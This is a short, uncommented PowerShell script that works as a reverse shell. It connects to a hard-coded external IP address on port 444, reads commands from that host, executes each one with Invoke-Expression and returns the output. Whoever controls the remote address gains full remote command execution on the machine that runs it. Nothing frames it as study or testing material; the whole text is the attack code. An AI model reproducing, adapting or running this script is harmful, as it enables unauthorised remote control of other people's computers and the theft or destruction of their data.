$ip = "37.61.221.153"
$port = 444
$tcpclient = New-Object System.Net.Sockets.TcpClient($ip, $port) 2>$null
$stream = $tcpclient.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while ($true) {
    $cmd = $reader.ReadLine()
    if ($cmd -eq "exit") {
        break
    }
    $output = Invoke-Expression $cmd 2>&1
    if ($output -is [System.Array]) {
        $output = $output -join "`n"
    }
    $writer.WriteLine($output)
    $writer.Flush()
}
$tcpclient.Close()
